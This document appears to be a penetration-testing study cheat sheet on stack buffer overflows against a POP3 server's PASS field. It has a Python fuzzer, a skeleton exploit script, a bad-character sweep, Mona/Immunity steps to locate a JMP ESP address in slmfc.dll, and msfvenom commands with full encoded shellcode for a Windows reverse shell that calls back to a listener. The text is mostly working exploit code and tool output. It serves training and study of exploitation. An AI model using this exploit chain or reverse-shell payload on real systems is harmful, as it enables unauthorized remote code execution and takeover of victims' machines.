# BUFFER OVERFLOWS

Fuzzing
=======

Microsoft memory protections:  

DEP = Data Execution Prevention  
ASLR = Address Space Layout Randomization  

Python fuzzer example:
```
#!/usr/bin/python
import socket

# Create an array of buffers, from 10 to 2000, with increments of 20
buffer=["A"]
counter=100
while len(buffer) <= 30:
  buffer.append("A"*counter)
  counter=counter+200

for string in buffer:
  print "Fuzzing PASS with %s bytes" % len(string)
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect=s.connect(('192.168.0.1',110))
  s.recv(1024)
  s.send('USER test\r\n')
  s.recv(1024)
  s.send('PASS ' + string + '\r\n')
  s.send('QUIT\r\n')
  s.close()
```

Replicating / Skeleton Exploit
==============================

Example:
```
#!/usr/bin/python
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer='A' * 2000

try:
print "\n Sending evil buffer..."
connect=s.connect(('192.168.0.1',110))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
print "\n Done!"
s.close()
except:
print "Could not connect to pop3!"
```

Shellcode
=========

Typical reverse shell payload requires 350-400 bytes of space. If not enough, try increasing the buffer and see if this results in larger override.  

Bad Characters
==============

Bad chars should not be used in buffer / return address /shellcode.  
Examples: null (`00`), carriage return (`0D`)  

Send all hex characters and see how the application behaves:
```
(badchars=)

\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19 +
\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32 +
\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b +
\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64 +
\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d +
\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96 +
\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf +
\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8 +
\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1 +
\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff


buffer = "A"*2000 + "B"*4 + badchars
```
Run, follow ESP in dump/memory locaton. It should be 01 02 03 04 ... etc with no truncations or missing/filtered chars. So for example if 09 is the last correct character, 0A is the one we should avoid.  
Remove the badchar from the badchars, resend payload.  


Redirecting Execution Flow
==========================

We need to find a way to redirect the execution flow at the time of the crash to the shellcode located at the memory address that the ESP register is pointing to at crash time.
The intuitive way would be to replace the EIP value with the ESP one. This way the execution would be directed to the beginning of our shellcode which is pointed to by the ESP register. However that would not work because at each crash ESP value changes.

That's where dll's drives and modules come in which contain extra fuctions.  

Use Mona for this:  

`!mona modules`  

Choose instructions from a module that matches a few criteria:  

1) No mem protections (ASLR, DEP)  
2) Memory range of the dll itself does not contain bad characters  

In our case the only suitable module is slmfc.dll. It will load at the same address at each reboot.  
Now we need to find  JMP ESP or similar instruction and find out what address it is located at.  

Go to executable modules list ("e" after l in top menu). Locate slmfc.dll, double click on it.  
Right click, search for, Command -> jmp esp. Push esp \n retn? Not found.  

Click on m letter in the above menu. (modules list). The .text section of the module is actually marked as executable. Since no mem protetions, we can use any of these. How to search in whole smfc.dll? We need to find JMP ESP opcode equivalent.  

`ruby /usr/share/metasploit-framework/tools/nasm_shell.rb`  

OR  

```
root@kali:~# cd /usr/share/metasploit-framework/tools/
root@kali:/usr/share/metasploit-framework/tools# ./metasm_shell.rb
type "exit" or "quit" to quit
```

In our case the equivalent is FFE4:  
```
metasm > jmp esp
"\xff\xe4"
```
Use mona script in immunity dbg to search:  

`!mona find -s "\xff\xe4\" -m slmfc.dll`  

"Results" are displayed. We verify if this indeed contains the JPM ESP instruction. Select, click on the black arrow to dots button, enter expression to follow: 0x5f4a358f address (it can be seen on the left of the results).  

3) Replace the B's in the buffer with the address (but written in reverse due to little endian format):  

`buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "C"*(3500-2606-4)`  

Locate the mem address in immunity and place a breakpoint (due to bug, might need to do it twice).  
Now the ESP should point to the beginning of Cs in the buffer.  


Generating Shellcode
====================

1) Generate Windows reverse shell with msfpayload:  

`msfpayload windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=443 C`  

(C= provide shellcode output in C formatted layout we could use in python script)   

2) Notice bad characters in payload. Encode payload with msfencode:  

`msfencode -h`  

Regenerate in R(raw) format and pipe the output to encode and avoid bad chars:  

`msfpayload windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=443 R |msfencode -b '\x00\x0a\x0d'`  

Or msfvenom:  
```
root@kali:~# msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -i 1 -f python LHOST=192.168.0.1 LPORT=443


No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)

buf =  ""
buf += "\xd9\xe1\xba\x27\x95\xd2\x95\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x50\x13\x03\x77\x86\x30"
buf += "\x60\x8b\x40\x36\x8b\x73\x91\x57\x05\x96\xa0\x57\x71"
buf += "\xd3\x93\x67\xf1\xb1\x1f\x03\x57\x21\xab\x61\x70\x46"
buf += "\x1c\xcf\xa6\x69\x9d\x7c\x9a\xe8\x1d\x7f\xcf\xca\x1c"
buf += "\xb0\x02\x0b\x58\xad\xef\x59\x31\xb9\x42\x4d\x36\xf7"
buf += "\x5e\xe6\x04\x19\xe7\x1b\xdc\x18\xc6\x8a\x56\x43\xc8"
buf += "\x2d\xba\xff\x41\x35\xdf\x3a\x1b\xce\x2b\xb0\x9a\x06"
buf += "\x62\x39\x30\x67\x4a\xc8\x48\xa0\x6d\x33\x3f\xd8\x8d"
buf += "\xce\x38\x1f\xef\x14\xcc\xbb\x57\xde\x76\x67\x69\x33"
buf += "\xe0\xec\x65\xf8\x66\xaa\x69\xff\xab\xc1\x96\x74\x4a"
buf += "\x05\x1f\xce\x69\x81\x7b\x94\x10\x90\x21\x7b\x2c\xc2"
buf += "\x89\x24\x88\x89\x24\x30\xa1\xd0\x20\xf5\x88\xea\xb0"
buf += "\x91\x9b\x99\x82\x3e\x30\x35\xaf\xb7\x9e\xc2\xd0\xed"
buf += "\x67\x5c\x2f\x0e\x98\x75\xf4\x5a\xc8\xed\xdd\xe2\x83"
buf += "\xed\xe2\x36\x03\xbd\x4c\xe9\xe4\x6d\x2d\x59\x8d\x67"
buf += "\xa2\x86\xad\x88\x68\xaf\x44\x73\xfb\x10\x30\x6b\x87"
buf += "\xf8\x43\x8b\x76\x42\xca\x6d\x12\xa4\x9b\x26\x8b\x5d"
buf += "\x86\xbc\x2a\xa1\x1c\xb9\x6d\x29\x93\x3e\x23\xda\xde"
buf += "\x2c\xd4\x2a\x95\x0e\x73\x34\x03\x26\x1f\xa7\xc8\xb6"
buf += "\x56\xd4\x46\xe1\x3f\x2a\x9f\x67\xd2\x15\x09\x95\x2f"
buf += "\xc3\x72\x1d\xf4\x30\x7c\x9c\x79\x0c\x5a\x8e\x47\x8d"
buf += "\xe6\xfa\x17\xd8\xb0\x54\xde\xb2\x72\x0e\x88\x69\xdd"
buf += "\xc6\x4d\x42\xde\x90\x51\x8f\xa8\x7c\xe3\x66\xed\x83"
buf += "\xcc\xee\xf9\xfc\x30\x8f\x06\xd7\xf0\xbf\x4c\x75\x50"
buf += "\x28\x09\xec\xe0\x35\xaa\xdb\x27\x40\x29\xe9\xd7\xb7"
buf += "\x31\x98\xd2\xfc\xf5\x71\xaf\x6d\x90\x75\x1c\x8d\xb1"
```

3) Repalce B's with shellcode, align so that the sum would be still 3500 bytes:  

`buffer="A"*2606 + "\x8f\x35\x4a\x5f" + shellcode + "C"*(3500-2606-4-351)`  

4) We need to provide the shellcode decoder a bit of stack space and compensate:  
```
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90\"*16 + shellcode + "C"*(3500-2606-4-351-16)
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" *16 + buf + "C"*(3500-2606-4-351-16)
```
This should provide a reverse shell.  
